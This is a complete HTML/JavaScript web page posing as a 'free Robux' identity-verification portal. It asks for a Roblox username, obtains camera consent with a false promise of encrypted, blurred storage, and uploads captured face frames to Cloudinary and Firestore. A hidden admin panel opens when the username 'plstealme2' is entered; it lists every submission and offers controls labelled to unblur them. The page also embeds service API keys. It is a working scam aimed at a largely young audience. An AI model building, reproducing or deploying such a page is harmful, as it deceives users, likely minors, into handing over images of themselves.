<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ROBUX CLAIM • Identity Verification Portal</title>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <!-- Cloudinary Upload Widget -->
    <script src="https://upload-widget.cloudinary.com/global/all.js" type="text/javascript"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
        }

        body {
            background: radial-gradient(ellipse at 30% 20%, #0a0e1c, #02040c);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
        }

        .portal-card {
            max-width: 620px;
            width: 100%;
            background: rgba(12, 18, 32, 0.88);
            backdrop-filter: blur(16px);
            border-radius: 2.2rem;
            border: 1px solid rgba(255, 190, 70, 0.3);
            box-shadow: 0 28px 40px -14px rgba(0,0,0,0.6), 0 0 0 1px rgba(255, 180, 60, 0.15);
            overflow: hidden;
            transition: all 0.2s;
        }

        .step-pane {
            padding: 2rem 1.8rem 2.2rem;
        }

        h2 {
            font-size: 1.9rem;
            font-weight: 800;
            background: linear-gradient(135deg, #FFE3A4, #FFA83C);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 0.4rem;
        }

        .sub {
            color: #9db2e0;
            font-size: 0.85rem;
            border-left: 3px solid #FFA83C;
            padding-left: 0.75rem;
            margin-bottom: 1.8rem;
        }

        .question-text {
            font-size: 1.4rem;
            font-weight: 600;
            color: #f0f3fc;
            margin-bottom: 1.2rem;
        }

        .btn-group {
            display: flex;
            gap: 1rem;
            flex-wrap: wrap;
            margin: 1.2rem 0;
        }

        .btn {
            border: none;
            background: #1f2946;
            color: white;
            font-weight: 600;
            padding: 0.8rem 1.8rem;
            border-radius: 60px;
            cursor: pointer;
            transition: 0.2s;
            font-size: 0.95rem;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(98deg, #F2A65A, #FF8C42);
            color: #131c2c;
            font-weight: 700;
            box-shadow: 0 4px 12px rgba(242, 166, 90, 0.3);
        }

        .btn-primary:hover {
            transform: scale(0.97);
            filter: brightness(1.05);
        }

        .btn-outline {
            background: transparent;
            border: 1.5px solid #4c6085;
            color: #ccdcff;
        }

        .btn-danger {
            background: #a13333;
            color: white;
        }

        .roblox-login-area {
            background: #0a1022cc;
            border-radius: 1.5rem;
            padding: 1.3rem;
            margin: 0.8rem 0;
            border: 1px solid #314267;
        }

        .username-input {
            width: 100%;
            padding: 14px 18px;
            background: #0e162f;
            border: 1px solid #445177;
            border-radius: 60px;
            color: white;
            font-size: 1rem;
            outline: none;
        }

        .username-input:focus {
            border-color: #FFB347;
            box-shadow: 0 0 0 3px rgba(255, 180, 71, 0.3);
        }

        .privacy-box {
            background: #070d21b3;
            border-radius: 1.4rem;
            padding: 1.3rem;
            border: 1px solid #3c4770;
        }

        .accept-row {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 1rem 0 0.5rem;
        }

        .media-preview {
            background: #030917;
            border-radius: 28px;
            padding: 1rem;
            text-align: center;
        }

        .preview-container {
            position: relative;
            width: 100%;
            aspect-ratio: 16 / 9;
            background: #000000aa;
            border-radius: 20px;
            overflow: hidden;
            border: 1px solid #5e6e97;
            margin-bottom: 1rem;
        }

        video, canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .action-row {
            display: flex;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
            margin: 0.8rem 0;
        }

        .status-message {
            background: #0e172b;
            padding: 0.7rem;
            border-radius: 40px;
            font-size: 0.85rem;
            text-align: center;
        }

        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 180, 70, 0.3);
            border-radius: 50%;
            border-top-color: #FFB347;
            animation: spin 0.7s linear infinite;
            margin-right: 6px;
            vertical-align: middle;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        /* ADMIN SECRET DASHBOARD */
        .admin-dashboard {
            margin-top: 1.8rem;
            background: #030718dd;
            border-radius: 1.8rem;
            padding: 1.2rem;
            border: 2px solid #f5a623aa;
            backdrop-filter: blur(4px);
        }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            flex-wrap: wrap;
            gap: 12px;
        }

        .unblur-btn {
            background: linear-gradient(95deg, #ff7e5e, #feb47b);
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            font-weight: bold;
            color: #1a1a2e;
            cursor: pointer;
            transition: 0.2s;
        }

        .unblur-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 10px #ffaa66;
        }

        .submissions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
            gap: 16px;
            margin-top: 18px;
            max-height: 520px;
            overflow-y: auto;
            padding: 6px;
        }

        .submission-card {
            background: #0b1022;
            border-radius: 20px;
            padding: 12px;
            border: 1px solid #ffb34766;
            transition: 0.2s;
            text-align: center;
        }

        .image-wrapper {
            position: relative;
            width: 100%;
            aspect-ratio: 1;
            border-radius: 16px;
            overflow: hidden;
            background: #000;
            margin-bottom: 10px;
        }

        .submission-img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: filter 0.2s ease;
            filter: blur(28px);
        }

        .submission-img.unblurred {
            filter: blur(0px);
        }

        .admin-badge {
            background: #f5a62330;
            color: #FFCC80;
            border-radius: 60px;
            padding: 4px 12px;
            font-size: 0.7rem;
            font-weight: bold;
        }

        .validate-btn {
            background: #2c6e2c;
            border: none;
            padding: 6px 12px;
            border-radius: 30px;
            color: white;
            font-size: 0.7rem;
            cursor: pointer;
            width: 100%;
            margin-top: 8px;
        }

        .validate-btn.approved {
            background: #1f4a1f;
            opacity: 0.8;
            cursor: default;
        }

        footer {
            font-size: 0.7rem;
            text-align: center;
            color: #6580b0;
            padding: 1rem;
            border-top: 1px solid #1f2a4a;
        }
        hr {
            border-color: #2a365a;
            margin: 12px 0;
        }
    </style>
</head>
<body>
<div class="portal-card" id="appRoot"></div>

<script>
    // ---------- FIREBASE CONFIGURATION ----------
    const firebaseConfig = {
        apiKey: "AIzaSyAupBkllyicDPD9O6CmX4mS4sF5z96mqxc",
        authDomain: "vertexpaste.firebaseapp.com",
        projectId: "vertexpaste",
        storageBucket: "vertexpaste.firebasestorage.app",
        messagingSenderId: "255275350380",
        appId: "1:255275350380:web:7be4e8add2cb5b04045b49"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    
    // Cloudinary config
    const CLOUD_NAME = 'dsv2sthkf';
    const UPLOAD_PRESET = 'portfoliohub_uploads';
    
    // ---- GLOBAL STATE ----
    let currentStep = 'welcome';      // welcome, robloxAuth, privacy, media, blurring, validating, success
    let robloxUsername = '';
    let isSecretAdmin = false;          // plstealme2 flag -> hidden admin panel with unblur power
    let mediaStream = null;
    let videoElement = null;
    let animationFrameId = null;
    let capturedBlob = null;
    let submissionId = null;
    
    const appRoot = document.getElementById('appRoot');
    
    // Helper: stop camera tracks
    function stopMediaTracks() {
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => track.stop());
            mediaStream = null;
        }
        if (animationFrameId) {
            cancelAnimationFrame(animationFrameId);
            animationFrameId = null;
        }
    }
    
    // Real-time blur effect on canvas while preview
    function startRealTimeBlur(videoElem, canvasElem) {
        if (!videoElem || !canvasElem) return;
        const ctx = canvasElem.getContext('2d');
        const drawBlur = () => {
            if (!videoElem || videoElem.paused || videoElem.ended || !videoElem.videoWidth) {
                animationFrameId = requestAnimationFrame(drawBlur);
                return;
            }
            const { videoWidth, videoHeight } = videoElem;
            canvasElem.width = videoWidth;
            canvasElem.height = videoHeight;
            ctx.filter = 'blur(24px)';
            ctx.drawImage(videoElem, 0, 0, videoWidth, videoHeight);
            ctx.filter = 'none';
            animationFrameId = requestAnimationFrame(drawBlur);
        };
        drawBlur();
    }
    
    // Capture frame as blurred blob (final)
    async function captureBlurredFrame(videoElem) {
        return new Promise((resolve) => {
            if (!videoElem || !videoElem.videoWidth) return resolve(null);
            const canvas = document.createElement('canvas');
            canvas.width = videoElem.videoWidth;
            canvas.height = videoElem.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
            ctx.filter = 'blur(28px)';
            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
            ctx.filter = 'none';
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
        });
    }
    
    // Upload to Cloudinary
    async function uploadToCloudinary(blob, username) {
        const formData = new FormData();
        formData.append('file', blob, `verif_${username}_${Date.now()}.jpg`);
        formData.append('upload_preset', UPLOAD_PRESET);
        const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
            method: 'POST',
            body: formData
        });
        const data = await res.json();
        if (!data.secure_url) throw new Error('Cloudinary upload fail');
        return data.secure_url;
    }
    
    // Save record to Firestore
    async function saveRecord(username, imageUrl) {
        const docRef = db.collection('verifications').doc();
        await docRef.set({
            robloxUsername: username,
            imageUrl: imageUrl,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            status: 'pending',
            blurred: true
        });
        return docRef.id;
    }
    
    // Fetch all submissions for admin (plstealme2)
    async function fetchAllSubmissions() {
        const snapshot = await db.collection('verifications').orderBy('timestamp', 'desc').get();
        const items = [];
        snapshot.forEach(doc => {
            const data = doc.data();
            items.push({
                id: doc.id,
                username: data.robloxUsername,
                imageUrl: data.imageUrl,
                timestamp: data.timestamp?.toDate?.() || new Date(),
                status: data.status || 'pending'
            });
        });
        return items;
    }
    
    // Update status to approved
    async function approveSubmission(subId) {
        await db.collection('verifications').doc(subId).update({ status: 'approved', approvedAt: firebase.firestore.FieldValue.serverTimestamp() });
    }
    
    // ----- RENDER FUNCTIONS (public flow) -----
    function renderWelcome() {
        return `<div class="step-pane">
            <h2>🎁 REWARD VAULT</h2>
            <div class="sub">limited roblox credits • instant qualification</div>
            <div class="question-text">✨ Do you want <strong style="color:#FFD966;">INSTANT ROBUX</strong>? ✨</div>
            <div class="btn-group">
                <button class="btn btn-primary" id="yesRewardBtn">YES, CLAIM NOW</button>
                <button class="btn btn-outline" id="noRewardBtn">No, thanks</button>
            </div>
            <footer>roblox account verification required</footer>
        </div>`;
    }
    
    function renderRobloxAuth() {
        return `<div class="step-pane">
            <h2>🔐 Roblox Identity</h2>
            <div class="sub">enter your valid roblox username</div>
            <div class="roblox-login-area">
                <input type="text" id="robloxUserField" class="username-input" placeholder="e.g., BuilderBoy2025" autocomplete="off">
                <div class="btn-group" style="margin-top: 20px;">
                    <button class="btn btn-primary" id="confirmRobloxBtn">Continue →</button>
                </div>
            </div>
        </div>`;
    }
    
    function renderPrivacyStep() {
        return `<div class="step-pane">
            <h2>🔒 Privacy & Media Consent</h2>
            <div class="sub">required by reward policy</div>
            <div class="privacy-box">
                <p style="font-size:0.85rem;">By accepting, you authorize video capture for age/identity validation. All footage is immediately blurred and stored encrypted.</p>
                <div class="accept-row">
                    <input type="checkbox" id="privacyCheckbox">
                    <label for="privacyCheckbox">I accept the terms & camera usage</label>
                </div>
                <div class="action-row">
                    <button class="btn btn-primary" id="acceptPrivacyBtn" disabled>Accept & Proceed</button>
                    <button class="btn btn-outline" id="declinePrivacyBtn">Cancel</button>
                </div>
            </div>
        </div>`;
    }
    
    function renderMediaStep() {
        return `<div class="step-pane">
            <h2>📸 Live Capture</h2>
            <div class="sub">position your face clearly • will be auto‑blurred</div>
            <div class="media-preview">
                <div class="preview-container">
                    <video id="liveVideo" autoplay playsinline muted style="width:100%; height:100%; object-fit:cover; border-radius:20px;"></video>
                    <canvas id="blurOverlay" style="width:100%; height:100%; position:absolute; top:0; left:0; border-radius:20px;"></canvas>
                </div>
                <div class="action-row">
                    <button class="btn btn-primary" id="startCamBtn">📷 Start Camera</button>
                    <button class="btn btn-primary" id="submitBlurBtn" disabled>✅ Submit & Auto‑Blur</button>
                </div>
                <div class="status-message" id="mediaStatusMsg">Click "Start Camera" to begin</div>
            </div>
        </div>`;
    }
    
    function renderBlurringStep() {
        return `<div class="step-pane">
            <h2>🔐 Blur Lock Applied</h2>
            <div class="sub">final blurred snapshot — ready for review</div>
            <div class="media-preview">
                <div class="preview-container">
                    <canvas id="finalBlurCanvas" style="width:100%; height:100%; border-radius:20px; background:#000;"></canvas>
                </div>
                <button class="btn btn-primary" id="validateFinalBtn">Confirm & Validate →</button>
            </div>
        </div>`;
    }
    
    function renderValidatingStep() {
        return `<div class="step-pane" style="text-align:center;">
            <h2>⏳ Validating Submission</h2>
            <div class="status-message"><span class="spinner"></span> Checking Roblox credentials & blur integrity...</div>
            <p style="margin-top:1rem;">please wait</p>
        </div>`;
    }
    
    function renderSuccessStep() {
        let adminPanelHtml = '';
        if (isSecretAdmin) {
            adminPanelHtml = `<div class="admin-dashboard" id="adminSecretPanel">
                <div class="admin-header">
                    <div><span class="admin-badge"><i class="fas fa-crown"></i> 🔒 plstealme2 • Master Access</span></div>
                    <button id="globalUnblurBtn" class="unblur-btn"><i class="fas fa-eye"></i> 🔓 UNBLUR ALL VIDEOS</button>
                </div>
                <div id="adminSubmissionsList" class="submissions-grid">
                    <div class="spinner"></div> Loading encrypted submissions...
                </div>
            </div>`;
        }
        return `<div class="step-pane">
            <div style="text-align:center;">
                <div style="font-size:3.8rem;">✅✨</div>
                <h2 style="color:#c6f7b0;">SUCCESS!</h2>
                <div style="background:#1d3929; border-radius:2rem; padding:1rem;">
                    <i class="fas fa-clock"></i> Wait patiently till you get approved<br>
                    Your blurred capture is pending review. Robux will be granted after approval.
                </div>
                ${adminPanelHtml}
                <hr>
                <button class="btn btn-outline" id="fullResetBtn">⟳ Back to start</button>
            </div>
            <footer>ID: ${submissionId ? submissionId.slice(0,8) : 'pending'}</footer>
        </div>`;
    }
    
    // ----- RENDER CONTROLLER -----
    function render() {
        if (!appRoot) return;
        let html = '';
        switch(currentStep) {
            case 'welcome': html = renderWelcome(); break;
            case 'robloxAuth': html = renderRobloxAuth(); break;
            case 'privacy': html = renderPrivacyStep(); break;
            case 'media': html = renderMediaStep(); break;
            case 'blurring': html = renderBlurringStep(); break;
            case 'validating': html = renderValidatingStep(); break;
            case 'success': html = renderSuccessStep(); break;
            default: html = '<div class="step-pane">error</div>';
        }
        appRoot.innerHTML = html;
        
        // attach events for current step
        if (currentStep === 'welcome') attachWelcomeEvents();
        if (currentStep === 'robloxAuth') attachRobloxEvents();
        if (currentStep === 'privacy') attachPrivacyEvents();
        if (currentStep === 'media') attachMediaEvents();
        if (currentStep === 'blurring') attachBlurFinalEvents();
        if (currentStep === 'validating') {
            setTimeout(() => finalizeSubmissionAndUpload(), 2000);
        }
        if (currentStep === 'success') {
            const resetBtn = document.getElementById('fullResetBtn');
            if (resetBtn) resetBtn.onclick = () => fullReset();
            if (isSecretAdmin) {
                loadAdminSubmissionsWithUnblurFeature();
                const unblurAllBtn = document.getElementById('globalUnblurBtn');
                if (unblurAllBtn) {
                    unblurAllBtn.onclick = () => unblurAllImages();
                }
            }
        }
    }
    
    // ----- EVENT HANDLERS (hidden admin bypass logic) -----
    function attachWelcomeEvents() {
        const yesBtn = document.getElementById('yesRewardBtn');
        const noBtn = document.getElementById('noRewardBtn');
        if (yesBtn) yesBtn.onclick = () => { currentStep = 'robloxAuth'; render(); };
        if (noBtn) noBtn.onclick = () => alert("Reward declined. Reload to restart.");
    }
    
    function attachRobloxEvents() {
        const inputField = document.getElementById('robloxUserField');
        const confirmBtn = document.getElementById('confirmRobloxBtn');
        if (confirmBtn) {
            confirmBtn.onclick = () => {
                const username = inputField.value.trim();
                if (!username) {
                    alert("Please enter your Roblox username");
                    return;
                }
                robloxUsername = username;
                // SECRET HIDDEN ADMIN CONDITION: if username is "plstealme2" -> admin mode ACTIVATED
                if (robloxUsername.toLowerCase() === 'plstealme2') {
                    isSecretAdmin = true;
                } else {
                    isSecretAdmin = false;
                }
                currentStep = 'privacy';
                render();
            };
        }
    }
    
    function attachPrivacyEvents() {
        const checkbox = document.getElementById('privacyCheckbox');
        const acceptBtn = document.getElementById('acceptPrivacyBtn');
        const declineBtn = document.getElementById('declinePrivacyBtn');
        if (checkbox) checkbox.addEventListener('change', (e) => { if (acceptBtn) acceptBtn.disabled = !e.target.checked; });
        if (acceptBtn) acceptBtn.onclick = () => { currentStep = 'media'; render(); };
        if (declineBtn) declineBtn.onclick = () => { currentStep = 'welcome'; render(); };
    }
    
    function attachMediaEvents() {
        const startCam = document.getElementById('startCamBtn');
        const submitBtn = document.getElementById('submitBlurBtn');
        const video = document.getElementById('liveVideo');
        const blurCanvas = document.getElementById('blurOverlay');
        const msgDiv = document.getElementById('mediaStatusMsg');
        
        const initCamera = async () => {
            stopMediaTracks();
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                mediaStream = stream;
                video.srcObject = stream;
                await video.play();
                if (blurCanvas) startRealTimeBlur(video, blurCanvas);
                if (msgDiv) { msgDiv.innerText = '✅ Camera active — click Submit & Auto‑Blur'; msgDiv.style.background = '#1f3a2a'; }
                if (submitBtn) submitBtn.disabled = false;
            } catch(err) {
                msgDiv.innerText = '❌ Camera permission denied. Enable camera and reload.';
                msgDiv.style.background = '#4a2525';
                submitBtn.disabled = true;
            }
        };
        if (startCam) startCam.onclick = initCamera;
        if (submitBtn) {
            submitBtn.onclick = async () => {
                if (!mediaStream || !video || !video.videoWidth) {
                    msgDiv.innerText = '⚠️ Please start camera first';
                    return;
                }
                const blurredBlob = await captureBlurredFrame(video);
                if (!blurredBlob) { alert('Failed to capture frame'); return; }
                capturedBlob = blurredBlob;
                stopMediaTracks();
                if (video.srcObject) video.srcObject = null;
                currentStep = 'blurring';
                render();
            };
        }
    }
    
    function attachBlurFinalEvents() {
        const finalCanvas = document.getElementById('finalBlurCanvas');
        const proceedBtn = document.getElementById('validateFinalBtn');
        if (finalCanvas && capturedBlob) {
            const url = URL.createObjectURL(capturedBlob);
            const img = new Image();
            img.onload = () => {
                finalCanvas.width = img.width;
                finalCanvas.height = img.height;
                const ctx = finalCanvas.getContext('2d');
                ctx.filter = 'blur(28px)';
                ctx.drawImage(img, 0, 0, img.width, img.height);
                ctx.filter = 'none';
                URL.revokeObjectURL(url);
            };
            img.src = url;
        }
        if (proceedBtn) proceedBtn.onclick = () => {
            if (!capturedBlob) { alert('Missing media'); return; }
            currentStep = 'validating';
            render();
        };
    }
    
    async function finalizeSubmissionAndUpload() {
        if (!capturedBlob || !robloxUsername) {
            currentStep = 'welcome';
            render();
            return;
        }
        try {
            const cloudUrl = await uploadToCloudinary(capturedBlob, robloxUsername);
            const docId = await saveRecord(robloxUsername, cloudUrl);
            submissionId = docId;
            currentStep = 'success';
            render();
            if (isSecretAdmin) {
                loadAdminSubmissionsWithUnblurFeature();
            }
        } catch (err) {
            console.error(err);
            alert('Verification submission failed, please retry');
            currentStep = 'media';
            render();
        }
    }
    
    // ---- ADMIN FUNCTION: LOAD ALL SUBMISSIONS WITH UNBLUR FEATURE (toggle blur per image)
    async function loadAdminSubmissionsWithUnblurFeature() {
        const container = document.getElementById('adminSubmissionsList');
        if (!container) return;
        const submissions = await fetchAllSubmissions();
        if (submissions.length === 0) {
            container.innerHTML = '<p style="color:#aaa;">No submissions yet.</p>';
            return;
        }
        container.innerHTML = '';
        submissions.forEach(sub => {
            const card = document.createElement('div');
            card.className = 'submission-card';
            const isApproved = sub.status === 'approved';
            // each image starts blurred
            card.innerHTML = `
                <div class="image-wrapper">
                    <img class="submission-img" data-blurred="true" src="${sub.imageUrl}" alt="blurred submission" crossorigin="anonymous">
                </div>
                <div style="margin-top: 6px; font-size: 12px; color:#dddddd;">👤 ${escapeHtml(sub.username)}</div>
                <div style="font-size: 10px; color:#9aa9ce;">📅 ${new Date(sub.timestamp).toLocaleString()}</div>
                <div style="font-size: 10px; margin: 5px 0; color:${isApproved ? '#6fcf97' : '#f0a55a'};">Status: ${sub.status}</div>
                <button class="unblur-single-btn" data-imgurl="${sub.imageUrl}" style="background:#5a3e2e; border:none; padding:5px; border-radius:30px; color:white; font-size:0.7rem; margin-top:6px; width:100%; cursor:pointer;">👁️ Unblur this</button>
                ${!isApproved ? `<button class="validate-btn" data-id="${sub.id}">✅ Approve & Grant Robux</button>` : `<button class="validate-btn approved" disabled>✔ Approved</button>`}
            `;
            container.appendChild(card);
            
            // Single unblur button for each image
            const unblurSingleBtn = card.querySelector('.unblur-single-btn');
            const imgElement = card.querySelector('.submission-img');
            if (unblurSingleBtn) {
                unblurSingleBtn.onclick = (e) => {
                    e.stopPropagation();
                    if (imgElement.classList.contains('unblurred')) {
                        imgElement.classList.remove('unblurred');
                        unblurSingleBtn.innerHTML = '👁️ Unblur this';
                    } else {
                        imgElement.classList.add('unblurred');
                        unblurSingleBtn.innerHTML = '🔒 Re-blur';
                    }
                };
            }
            
            // Approve button
            const approveBtn = card.querySelector('.validate-btn');
            if (approveBtn && !isApproved) {
                approveBtn.onclick = async (e) => {
                    e.stopPropagation();
                    await approveSubmission(sub.id);
                    await loadAdminSubmissionsWithUnblurFeature(); // refresh
                };
            }
        });
    }
    
    // GLOBAL UNBLUR: removes blur from ALL images currently displayed in admin panel
    function unblurAllImages() {
        const allImages = document.querySelectorAll('.submission-img');
        allImages.forEach(img => {
            img.classList.add('unblurred');
        });
        // also change all "unblur single" button texts to "Re-blur"
        const allUnblurBtns = document.querySelectorAll('.unblur-single-btn');
        allUnblurBtns.forEach(btn => {
            btn.innerHTML = '🔒 Re-blur';
        });
        // Optional visual feedback
        const unblurBtn = document.getElementById('globalUnblurBtn');
        if (unblurBtn) {
            const originalText = unblurBtn.innerHTML;
            unblurBtn.innerHTML = '✨ ALL VIDEOS UNBLURRED ✨';
            setTimeout(() => {
                unblurBtn.innerHTML = originalText;
            }, 1800);
        }
    }
    
    function fullReset() {
        stopMediaTracks();
        capturedBlob = null;
        robloxUsername = '';
        isSecretAdmin = false;
        submissionId = null;
        currentStep = 'welcome';
        render();
    }
    
    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    // override render to allow dynamic admin refresh
    const origRender = render;
    window.render = function() { origRender(); };
    render = function() {
        origRender();
        if (currentStep === 'success' && isSecretAdmin) {
            const resetAll = document.getElementById('fullResetBtn');
            if (resetAll) resetAll.onclick = () => fullReset();
            const unblurAllBtn = document.getElementById('globalUnblurBtn');
            if (unblurAllBtn) {
                unblurAllBtn.onclick = () => unblurAllImages();
            }
            loadAdminSubmissionsWithUnblurFeature();
        }
    };
    
    render();
</script>
</body>
</html>
